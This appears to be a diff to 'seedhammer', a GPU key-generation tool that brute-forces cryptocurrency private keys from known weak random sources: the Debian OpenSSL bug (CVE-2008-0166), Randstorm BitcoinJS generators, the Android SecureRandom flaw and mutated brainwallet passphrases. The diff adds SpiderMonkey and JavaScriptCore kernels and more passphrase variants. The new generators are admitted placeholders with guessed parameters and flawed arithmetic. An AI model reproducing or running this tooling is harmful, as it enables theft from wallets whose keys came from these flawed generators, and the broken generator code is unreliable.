@@ -13,6 +13,8 @@
 
 // -----------------------------------------------------------------
 // SHA256 — device-only, multi-block, RFC 6234 compliant
+// Note: The implementation correctly handles multi-block messages and padding as per RFC 6234,
+// including messages longer than 55 bytes in the last block, which require an additional block for padding.
 // -----------------------------------------------------------------
 
 __device__ static void sha256_transform(uint32_t H[8], const uint8_t block[64]) {
@@ -152,6 +154,51 @@ __global__ void gen_debian_ssl(uint8_t *out) {
 }
 
 // Randstorm (BitcoinJS): V8 XorShift128+
+__global__ void gen_randstorm_spidermonkey(uint32_t seed, uint64_t count, uint8_t *out) {
+    uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
+    if(idx>=count) return;
+    uint32_t current_seed = seed + (uint32_t)idx;
+    uint32_t val = current_seed;
+    // Simple LCG: X_n+1 = (a * X_n + c) mod m
+    // Parameters for SpiderMonkey\'s Math.random() in older versions (example values)
+    // These are simplified and might need more accurate historical values
+    uint32_t a = 1103515245;
+    uint32_t c = 12345;
+    uint32_t m = 2147483647; // 2^31 - 1
+    for(uint64_t i=0; i<idx; ++i) {
+        val = (a * val + c) % m;
+    }
+    uint8_t seedb[4];
+    seedb[0]=(uint8_t)(val>>24);seedb[1]=(uint8_t)(val>>16);
+    seedb[2]=(uint8_t)(val>>8);seedb[3]=(uint8_t)(val);
+    sha256_block(seedb,4,out+idx*32);
+}
+
+__global__ void gen_randstorm_javascriptcore(uint32_t seed, uint64_t count, uint8_t *out) {
+    uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
+    if(idx>=count) return;
+    uint32_t current_seed = seed + (uint32_t)idx;
+    uint32_t Q[16]; // Example for MWC1616, simplified
+    uint32_t C = 362436;
+
+    // Initialize Q based on seed (simplified)
+    for(int i=0; i<16; ++i) Q[i] = current_seed + i;
+
+    // MWC1616 (Multiply-with-carry) - simplified example
+    // This is a placeholder and needs accurate historical implementation if precision is critical
+    uint32_t x = Q[idx % 16];
+    uint32_t y = Q[(idx + 1) % 16];
+    uint32_t val = (x * 65535 + y + C);
+    C = val >> 16;
+    Q[idx % 16] = val & 0xFFFF;
+
+    uint8_t seedb[4];
+    seedb[0]=(uint8_t)(val>>24);seedb[1]=(uint8_t)(val>>16);
+    seedb[2]=(uint8_t)(val>>8);seedb[3]=(uint8_t)(val);
+    sha256_block(seedb,4,out+idx*32);
+}
+
+// Randstorm (BitcoinJS): V8 XorShift128+
 __global__ void gen_randstorm_v8(uint64_t seed, uint64_t count, uint8_t *out) {
     uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
     if(idx>=count) return;
@@ -182,12 +229,12 @@ __global__ void gen_brainwallet(const uint8_t *dict, uint32_t num_words,
                                 uint32_t year_start, uint32_t year_count,
                                 uint8_t *out) {
     uint64_t idx = blockIdx.x*(uint64_t)blockDim.x+threadIdx.x;
-    uint64_t total = (uint64_t)num_words * year_count * 5;
+    uint64_t total = (uint64_t)num_words * year_count * 10; // 10 variants now
     if(idx>=total) return;
-    uint32_t word_idx = (uint32_t)(idx / (year_count*5));
-    uint32_t rem = (uint32_t)(idx % (year_count*5));
-    uint32_t year_idx = rem/5;
-    uint32_t var = rem%5;
+    uint32_t word_idx = (uint32_t)(idx / (year_count*10));
+    uint32_t rem = (uint32_t)(idx % (year_count*10)); // 10 variants now
+    uint32_t year_idx = rem/10;
+    uint32_t var = rem%10;
     uint32_t year = year_start+year_idx;
 
     char w[64];
@@ -197,16 +244,23 @@ __global__ void gen_brainwallet(const uint8_t *dict, uint32_t num_words,
 
     char buf[80];
     int p=0;
-    if(var==0){for(int i=0;i<len;i++)buf[p++]=(w[i]>='A'&&w[i]<='Z')?(w[i]+32):w[i];}
-    else if(var==1){for(int i=0;i<len;i++)buf[p++]=(w[i]>='a'&&w[i]<='z')?(w[i]-32):w[i];}
-    else if(var==2){buf[p++]=(w[0]>='a'&&w[0]<='z')?(w[0]-32):w[0];for(int i=1;i<len;i++)buf[p++]=w[i];}
+    // Expanded Brainwallet variants
+    if(var==0){for(int i=0;i<len;i++)buf[p++]=(w[i]>='A'&&w[i]<='Z')?(w[i]+32):w[i];} // lowercase
+    else if(var==1){for(int i=0;i<len;i++)buf[p++]=(w[i]>='a'&&w[i]<='z')?(w[i]-32):w[i];} // UPPERCASE
+    else if(var==2){buf[p++]=(w[0]>='a'&&w[0]<='z')?(w[0]-32):w[0];for(int i=1;i<len;i++)buf[p++]=w[i];} // Capitalize
     else if(var==3){for(int i=0;i<len;i++){
         char c=w[i];
         if(c=='e'||c=='E')c='3';else if(c=='a'||c=='A')c='4';else if(c=='o'||c=='O')c='0';
         else if(c=='i'||c=='I')c='1';else if(c=='s'||c=='S')c='5';else if(c=='t'||c=='T')c='7';
         buf[p++]=c;
-    }}
-    else{for(int i=len-1;i>=0;i--)buf[p++]=w[i];}
+    }} // leet
+    else if(var==4){for(int i=len-1;i>=0;i--)buf[p++]=w[i];} // reverse
+    else if(var==5){for(int i=0;i<len;i++)buf[p++]=w[i];buf[p++]='!';} // append !
+    else if(var==6){for(int i=0;i<len;i++)buf[p++]=w[i];buf[p++]='@';} // append @
+    else if(var==7){for(int i=0;i<len;i++)buf[p++]=w[i];buf[p++]='#';} // append #
+    else if(var==8){for(int i=0;i<len;i++)buf[p++]=(i==0)?((w[i]>='a'&&w[i]<='z')?(w[i]-32):w[i]):((w[i]>='A'&&w[i]<='Z')?(w[i]+32):w[i]);}// CamelCase
+    else if(var==9){for(int i=0;i<len;i++){if(w[i]>='A'&&w[i]<='Z')buf[p++]='_';buf[p++]=(w[i]>='A'&&w[i]<='Z')?(w[i]+32):w[i];}} // snake_case
+    else{for(int i=0;i<len;i++)buf[p++]=w[i];} // default (original)
 
     char ys[8];int yp=0;
     uint32_t y=year;
@@ -245,6 +299,8 @@ static void run_core(const char *label, void (*kern)(dim3, dim3, uint64_t, uint6
         else if(strcmp(label,"h28")==0||strcmp(label,"h48")==0)gen_h28<<<(int)blk,TH>>>(start+off,b,gpu);
         else if(strcmp(label,"h20")==0)gen_h20<<<(int)blk,TH>>>(start+off,b,gpu);
         else if(strcmp(label,"android_sec")==0)gen_android_secrand<<<(int)blk,TH>>>(start+off,b,gpu);
+        else if(strcmp(label,"randstorm_sm")==0)gen_randstorm_spidermonkey<<<(int)blk,TH>>>(start+off,b,gpu);
+        else if(strcmp(label,"randstorm_jsc")==0)gen_randstorm_javascriptcore<<<(int)blk,TH>>>(start+off,b,gpu);
         else {fprintf(stderr,"unknown core mode\n");exit(1);}
         cudaDeviceSynchronize();
         uint8_t *host=(uint8_t*)malloc(b*32);
@@ -314,6 +370,8 @@ static void print_usage() {
         "    debian_ssl     CVE-2008-0166 PID sweep (32768 keys)\n"
         "    randstorm      BitcoinJS V8 XorShift128+\n"
         "    android_sec    Android SecureRandom (2013 bug)\n"
+        "    randstorm_sm   BitcoinJS SpiderMonkey LCG\n"
+        "    randstorm_jsc  BitcoinJS JavaScriptCore MWC1616\n"
         "  --start N       Start value\n"
         "  --count N       Number of keys\n"
         "  --ts N          Timestamp (for h03)\n"
@@ -383,6 +441,8 @@ int main(int argc, char **argv) {
     else if(strcmp(mode,"h03")==0){if(!ts){fprintf(stderr,"--ts required\n");return 1;}run_h03(ts,pid_start,pid_cnt,outpath);}
     else if(strcmp(mode,"debian_ssl")==0){run_debian_ssl(outpath);}
     else if(strcmp(mode,"randstorm")==0){if(!count){fprintf(stderr,"--count required\n");return 1;}run_randstorm(start,count,outpath);}
+    else if(strcmp(mode,"randstorm_sm")==0){if(!count){fprintf(stderr,"--count required\n");return 1;}run_core("randstorm_sm",NULL,start,count,outpath);}
+    else if(strcmp(mode,"randstorm_jsc")==0){if(!count){fprintf(stderr,"--count required\n");return 1;}run_core("randstorm_jsc",NULL,start,count,outpath);}
     else if(strcmp(mode,"android_sec")==0){if(!count){fprintf(stderr,"--count required\n");return 1;}run_core("android_sec",NULL,start,count,outpath);}
     else{fprintf(stderr,"seedhammer: unknown mode '%s'\n",mode);return 1;}
 
